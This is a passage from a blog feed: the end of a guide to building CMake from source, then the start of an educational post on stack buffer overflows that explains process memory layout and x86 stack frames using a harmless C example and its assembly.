</code></pre></div></div> <p>If you encounter an error at this step but the <code class="language-plaintext highlighter-rouge">which cmake</code> command still shows the binary path, you may need to reset the shell‚Äôs command hash table:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">hash</span> <span class="nt">-r</span>
</code></pre></div></div> <hr/> <h2 id="optional-cleanup-temporary-files">Optional: Cleanup Temporary Files</h2> <p>After the installation is complete, you can remove the temporary directory to free up space:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">rm</span> <span class="nt">-rf</span> ~/temp
</code></pre></div></div> <hr/> <h2 id="notes">Notes</h2> <ol> <li><strong>Updating CMake</strong>: If a new version of CMake is released, repeat the process with updated <code class="language-plaintext highlighter-rouge">version</code> and <code class="language-plaintext highlighter-rouge">build</code> variables.</li> <li><strong>Additional Libraries</strong>: If your project requires other dependencies, ensure they are installed before building CMake.</li> <li><strong>Alternative Installation</strong>: If you prefer not to compile from source, consider installing CMake from a precompiled binary or a PPA (for Ubuntu users).</li> </ol> <p>By following these steps, you‚Äôll have the latest version of CMake installed and ready to use!</p>]]></content><author><name></name></author><category term="cmake"/><category term="debian"/><category term="ubuntu"/><summary type="html"><![CDATA[Learn how to install the latest version of CMake on Debian-based systems. This guide covers prerequisites, removing older versions, compiling from source, and verifying the installation.]]></summary></entry><entry><title type="html">Stack Overflow Vulnerabilities</title><link href="https://markusthill.github.io/blog/2024/buffer-overflows/" rel="alternate" type="text/html" title="Stack Overflow Vulnerabilities"/><published>2024-12-17T05:16:00+00:00</published><updated>2024-12-17T05:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/buffer-overflows</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/buffer-overflows/"><![CDATA[<p>Buffer overflows remain one of the most common security vulnerabilities in modern software and typically result from improperly written programs. A buffer overflow occurs when a program allocates too little memory for a given amount of data. The excess data then overwrites adjacent memory areas, which can contain sensitive information such as program flow data, process memory, or pointers. Because attackers can manipulate this overwritten information to execute malicious code, buffer overflows are considered critical vulnerabilities.</p> <p>Most of today‚Äôs computer systems are based on the von Neumann architecture, where both data and programs reside in the same memory. This design makes it easier for attackers to exploit buffer overflows once they occur. However, the root cause of these vulnerabilities lies in careless programming practices; the von Neumann architecture merely facilitates their exploitation. In many programming languages, such as C or C++, memory overflow checks are left to the programmer, who may forget to implement them altogether or do so incorrectly.</p> <p>By contrast, buffer overflows in Java are virtually impossible because Java programs run within a runtime environment that detects and prevents memory overflows. Similarly, interpreted programming languages are rarely affected.</p> <p>For simplicity, this blog post will focus on buffer overflows on x86/IA-32 architectures. However, the underlying techniques are very similar for newer architectures.</p> <h2 id="process-memory-organization">Process Memory Organization</h2> <p>In order to understand the attack methods that exploit different buffer overflow vulnerabilities, it is necessary to first discuss the organization of the process memory in more detail.<br/> Typically, a process is provided with its own virtual address space by the operating system, with which it can work. For 32-bit systems, for example, the virtual address space can comprise up to \(2^{32}\) addresses. Few processes will require the complete virtual address space. Therefore, it is not necessary and often impossible to assign a physical address to each virtual address. If necessary, the memory management unit (MMU) of the CPU will convert the virtual addresses into physical addresses.</p> <p>The memory of a process is divided into different areas, described in more detail below:</p> <ol> <li> <p><strong>Text segment</strong><br/> The executable code of the program is stored in the text segment. This segment can usually be accessed only in a read-only manner; write operations are prohibited and lead to an error. Hence, runtime code manipulation is not possible. Literals and constant pointers are usually stored in this segment as well.</p> </li> <li> <p><strong>Data segment</strong><br/> In general, all global and static variables are stored in the data segment of the process memory. Static variables are declared locally within functions but maintain their values when the function exits, so they cannot be placed on the stack like classic local variables.<br/> In the data segment itself, a distinction is often made between two areas: Data and BSS (Block Start by Symbol). The initialized global and static variables are stored in the Data area, while the non-initialized variables reside in the BSS area. The BSS area is usually zero-initialized, so variables that are not explicitly initialized by the programmer do not contain unexpected values.</p> </li> <li> <p><strong>Heap</strong><br/> During process runtime, memory can be dynamically allocated and released on the heap. The heap is used if the memory on the stack is insufficient or if the size of data structures can only be determined at runtime.</p> </li> <li> <p><strong>Stack</strong><br/> As mentioned, unlike global variables, local variables are placed on the stack. The stack can be visualized like a stack of plates: items are added (pushed) to the top and removed (popped) from the top.<br/> The stack is usually supported directly by the hardware of common processor architectures and plays a significant role in memory management, especially when functions/procedures are called. The following chapter will delve deeper into this topic.</p> </li> </ol> <p>In most processor architectures, the stack grows from the highest virtual memory address to the lower one. The heap grows in the opposite direction. Usually, the process memory layout will look like this:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/memoryOrga-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/memoryOrga-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/memoryOrga-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2018-02-05-buffer-overflows/memoryOrga.png" class="img-fluid rounded z-depth-1 imgcenter" width="300px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 1:</b> Process memory layout. </figcaption> </figure> <h2 id="intel-x86ia-32-architecture">Intel x86/IA-32 Architecture</h2> <p>In general, processor architectures are classified as either <strong>Little-Endian</strong> or <strong>Big-Endian</strong>, depending on how they store multibyte data in memory. On <strong>Little-Endian</strong> architectures, the ‚ÄúLeast Significant Byte‚Äù (LSB) is stored at the lower memory address, and the ‚ÄúMost Significant Byte‚Äù (MSB) at the higher address. <strong>Big-Endian</strong> architectures do the opposite.</p> <p>The Intel x86/IA-32 architecture we are examining uses the Little-Endian representation. This characteristic plays a significant role in certain vulnerabilities, particularly off-by-one buffer overflows.</p> <h3 id="base-registers">Base Registers</h3> <p>The base registers include EAX, EBX, ECX, EDX, ESP, EBP, ESI, and EDI. While each register has its own function, only ESP and EBP are essential for understanding the assembly code that follows.</p> <p><strong>ESP (Extended Stack Pointer)</strong><br/> This register points to the current position in the stack. Operations like <code class="language-plaintext highlighter-rouge">push</code> (placing an element on the stack) and <code class="language-plaintext highlighter-rouge">pop</code> (removing the last element from the stack) change the stack pointer automatically. However, the ESP register can also be manipulated directly.</p> <p><strong>EBP (Extended Base Pointer),</strong> often called the <strong>frame pointer</strong>, plays an important role in stack operations. When a function is called, EBP is set as a reference point for all stack operations within that function. Unlike ESP, the value of EBP remains constant throughout the function‚Äôs execution. It is updated only when control leaves the function. This design allows local variables on the stack to be addressed via offsets relative to the frame pointer. The area bounded by the frame pointer and stack pointer is known as the <strong>stack frame</strong>.</p> <h2 id="how-the-stack-works">How the Stack works</h2> <p>The following is a simple example of how the stack works. A small C-program serves as an example:</p> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">foo</span><span class="p">(</span><span class="kt">int</span> <span class="n">x</span><span class="p">,</span> <span class="kt">int</span> <span class="n">y</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff2</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
	<span class="n">i</span> <span class="o">=</span> <span class="n">x</span> <span class="o">+</span> <span class="n">y</span><span class="p">;</span>
 	<span class="k">return</span> <span class="n">i</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
	<span class="n">foo</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">9</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <p>For this code, you get the following assembly output:</p> <p>Function <code class="language-plaintext highlighter-rouge">main()</code>:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>
<span class="err">2</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>
<span class="err">3</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x18</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">4</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x8</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">5</span>	<span class="nf">push</span>   <span class="kc">$</span><span class="mh">0x9</span>
<span class="err">6</span>	<span class="nf">push</span>   <span class="kc">$</span><span class="mh">0x1</span>
<span class="err">7</span>	<span class="nf">call</span>   <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="nv">foo</span><span class="o">&gt;</span>
<span class="err">8</span>	<span class="nf">add</span>    <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">9</span>	<span class="nf">mov</span>    <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">10</span>	<span class="nf">leave</span>
<span class="err">11</span>	<span class="nf">ret</span></code></pre></figure> <p>Function <code class="language-plaintext highlighter-rouge">foo()</code>:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span>	<span class="nf">push</span>   <span class="o">%</span><span class="nb">ebp</span>
<span class="err">2</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">esp</span><span class="p">,</span><span class="o">%</span><span class="nb">ebp</span>
<span class="err">3</span>	<span class="nf">sub</span>    <span class="kc">$</span><span class="mh">0x38</span><span class="p">,</span><span class="o">%</span><span class="nb">esp</span>
<span class="err">4</span>	<span class="nf">mov</span>    <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">5</span>	<span class="nf">add</span>    <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">6</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mh">0xffffffd4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span>
<span class="err">7</span>	<span class="nf">mov</span>    <span class="mh">0xffffffd4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">8</span>	<span class="nf">mov</span>    <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="o">%</span><span class="nb">eax</span>
<span class="err">9</span>	<span class="nf">leave</span>
<span class="err">10</span>	<span class="nf">ret</span></code></pre></figure> <p>First, an explanation of the <code class="language-plaintext highlighter-rouge">main()</code> function:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span> <span class="nf">push</span> <span class="o">%</span><span class="nb">ebp</span>
<span class="err">2</span> <span class="nf">mov</span> <span class="o">%</span><span class="nb">esp</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p>The first two instructions appear in practically all functions. In line 1, the current frame pointer (hereafter FP0) is pushed onto the stack. In line 2, the stack pointer (ESP) is copied into EBP. At this address, the stack frame for <code class="language-plaintext highlighter-rouge">main()</code> begins.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">3</span> <span class="nf">sub</span> <span class="kc">$</span><span class="mh">0x18</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="err">4</span> <span class="nf">sub</span> <span class="kc">$</span><span class="mh">0x8</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p>These two instructions reserve memory space on the stack for the local variables <code class="language-plaintext highlighter-rouge">i</code> and <code class="language-plaintext highlighter-rouge">buff</code>. The <code class="language-plaintext highlighter-rouge">sub</code> operation moves the stack pointer toward lower addresses. Specifically, lines 3 and 4 subtract a total of 0x20 (decimal 32) from the ESP register. This is a direct manipulation of the stack pointer. Because the stack grows from higher to lower addresses, the operation must be a subtraction rather than an addition. (The fact that more memory is reserved than necessary will be discussed below.)</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">5</span> <span class="nf">push</span> <span class="kc">$</span><span class="mh">0x9</span>
<span class="err">6</span> <span class="nf">push</span> <span class="kc">$</span><span class="mh">0x1</span></code></pre></figure> <p>Next, the function call to <code class="language-plaintext highlighter-rouge">foo()</code> is prepared. The function expects two parameters, which are pushed onto the stack in lines 5 and 6. It is important to note that parameters must be placed on the stack in reverse order compared to their order in the C program.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">7</span> <span class="nf">call</span> <span class="mh">0x8048430</span> <span class="o">&lt;</span><span class="nv">foo</span><span class="o">&gt;</span></code></pre></figure> <p>After passing the parameters, execution branches to the <code class="language-plaintext highlighter-rouge">foo()</code> function. The <code class="language-plaintext highlighter-rouge">call</code> instruction performs two steps. First, the return address (RIP) is pushed onto the stack. This address points to the instruction that should execute after <code class="language-plaintext highlighter-rouge">foo()</code> returns‚Äîin this case, line 8 of the <code class="language-plaintext highlighter-rouge">main()</code> function. Second, the instruction pointer (EIP) is updated so that the program resumes execution at <code class="language-plaintext highlighter-rouge">foo()</code>. The stack now looks like this at this point in time:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/stack7-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/stack7-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/stack7-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2018-02-05-buffer-overflows/stack7.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 2:</b> Stack layout when calling <code class="language-plaintext highlighter-rouge">foo()</code>. </figcaption> </figure> <p>As mentioned before, execution now continues in the <code class="language-plaintext highlighter-rouge">foo()</code> function:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">1</span> <span class="nf">push</span> <span class="o">%</span><span class="nb">ebp</span>
<span class="err">2</span> <span class="nf">mov</span> <span class="o">%</span><span class="nb">esp</span><span class="p">,</span> <span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p>These first two lines mirror those in the <code class="language-plaintext highlighter-rouge">main()</code> function. The current frame pointer (FP1) is pushed onto the stack (line 1), and then the stack pointer (ESP) is copied into EBP (line 2). This allows the original frame pointer to be restored later when returning to <code class="language-plaintext highlighter-rouge">main()</code>.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">3</span> <span class="nf">sub</span> <span class="kc">$</span><span class="mh">0x38</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p>In line 3, memory space for the local variables is reserved on the stack by moving the stack pointer to a lower address.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">4</span> <span class="nf">mov</span> <span class="mh">0xc</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">5</span> <span class="nf">add</span> <span class="mh">0x8</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">6</span> <span class="nf">mov</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span><span class="mh">0xffffffd4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">)</span></code></pre></figure> <p>Line 4 loads the parameter <code class="language-plaintext highlighter-rouge">y</code> into the EAX register. This illustrates the purpose of the frame pointer, as function parameters are accessed relative to EBP rather than via absolute addresses. Here, parameter <code class="language-plaintext highlighter-rouge">y</code> is located 12 bytes (<code class="language-plaintext highlighter-rouge">0xc</code>) above the frame pointer, with the space in between taken by parameter <code class="language-plaintext highlighter-rouge">x</code>, the return address, and the previously saved frame pointer.</p> <p>Line 5 adds parameter <code class="language-plaintext highlighter-rouge">x</code> (located 8 bytes above EBP) to the value in EAX.<br/> Line 6 then stores the result in the local variable <code class="language-plaintext highlighter-rouge">i</code>, which is at a negative offset (in two‚Äôs complement form) relative to EBP.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">7</span> <span class="nf">mov</span> <span class="mh">0xffffffd4</span><span class="p">(</span><span class="o">%</span><span class="nb">ebp</span><span class="p">),</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">8</span> <span class="nf">mov</span> <span class="o">%</span><span class="nb">eax</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span></code></pre></figure> <p>Lines 7 and 8 are generally unnecessary. Presumably, they were intended to move the function‚Äôs return value into EAX (where numeric return values are typically placed). However, because EAX already holds the correct value, these instructions could be omitted.</p> <p>At this point, the stack looks like this:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2018-02-05-buffer-overflows/stack8-480.webp 480w,/assets/img/2018-02-05-buffer-overflows/stack8-800.webp 800w,/assets/img/2018-02-05-buffer-overflows/stack8-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2018-02-05-buffer-overflows/stack8.png" class="img-fluid rounded z-depth-1 imgcenter" width="750px" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 3:</b> Stack layout for <code class="language-plaintext highlighter-rouge">foo()</code>. </figcaption> </figure> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">9</span> <span class="nf">leave</span></code></pre></figure> <p>Line 9 prepares to leave the function, and can be thought of as a shorthand for:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nf">movl</span> <span class="o">%</span><span class="nb">ebp</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span>
<span class="nf">popl</span> <span class="o">%</span><span class="nb">ebp</span></code></pre></figure> <p>The <code class="language-plaintext highlighter-rouge">leave</code> instruction sets the stack pointer (ESP) to the current frame pointer (EBP). The old frame pointer is then located precisely at ESP, and a <code class="language-plaintext highlighter-rouge">pop</code> loads this saved frame pointer back into EBP.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">10</span> <span class="nf">ret</span></code></pre></figure> <p>After <code class="language-plaintext highlighter-rouge">leave</code> executes, the stack pointer points to the previously stored return address. The <code class="language-plaintext highlighter-rouge">ret</code> instruction (line 10) loads this address into the instruction register, resuming execution in <code class="language-plaintext highlighter-rouge">main()</code>.</p> <p>Back in <code class="language-plaintext highlighter-rouge">main()</code>, the last four instructions are processed:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">8</span> <span class="nf">add</span> <span class="kc">$</span><span class="mh">0x10</span><span class="p">,</span> <span class="o">%</span><span class="nb">esp</span></code></pre></figure> <p>After the function call, the parameters on the stack are no longer needed and must be removed. Line 8 removes 0x10 (16) bytes, not just 8 bytes for the two parameters (each 4 bytes). The extra 8 bytes likely stem from an additional reservation on the stack before each function call (see line 4). This reservation appears to be linked to a bug in the GCC compiler, as discussed below. Consequently, both the parameters and the extra 8 bytes must be reclaimed from the stack.</p> <p>Strictly speaking, if no further operations occur in <code class="language-plaintext highlighter-rouge">main()</code> after the <code class="language-plaintext highlighter-rouge">foo()</code> call, cleaning up the stack is not mandatory. Nevertheless, these instructions clearly illustrate the function call mechanism and stack usage.</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="err">9</span>  <span class="nf">mov</span> <span class="kc">$</span><span class="mh">0x0</span><span class="p">,</span> <span class="o">%</span><span class="nb">eax</span>
<span class="err">10</span> <span class="nf">leave</span>
<span class="err">11</span> <span class="nf">ret</span></code></pre></figure> <p>In these final lines, <code class="language-plaintext highlighter-rouge">main()</code> sets its return value to zero (line 9). The <code class="language-plaintext highlighter-rouge">leave</code> instruction resets ESP to EBP (line 10), and the <code class="language-plaintext highlighter-rouge">ret</code> instruction (line 11) terminates <code class="language-plaintext highlighter-rouge">main()</code> by popping the saved return address into the instruction register.</p> <p>The following animation provides a slightly simplified illustration of the entire process:</p> <div style="width: 100%" class="imgcenter"> <swiper-container keyboard="true" navigation="true" pagination="true" pagination-clickable="true" pagination-dynamic-bullets="true" rewind="true"> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack1-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack1-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack1-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack2-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack2-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack2-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack3-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack3-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack3-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack4-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack4-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack4-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack5-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack5-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack5-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack5.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack6-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack6-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack6-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack7-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack7-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack7-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack7.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack8-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack8-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack8-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack8.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack9-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack9-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack9-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack9.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack10-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack10-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack10-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack10.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack11-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack11-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack11-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack11.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack12-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack12-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack12-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack12.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack13-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack13-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack13-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack13.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack14-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack14-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack14-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack14.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack15-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack15-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack15-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack15.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack16-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack16-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack16-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack16.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack17-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack17-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack17-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack17.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </swiper-slide> <swiper-slide> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2024-12-16-buffer-overflows/stack18-480.webp 480w,/assets/img/2024-12-16-buffer-overflows/stack18-800.webp 800w,/assets/img/2024-12-16-buffer-overflows/stack18-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2024-12-16-buffer-overflows/stack18.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" loading="eager" onerror="this.onerror=null; 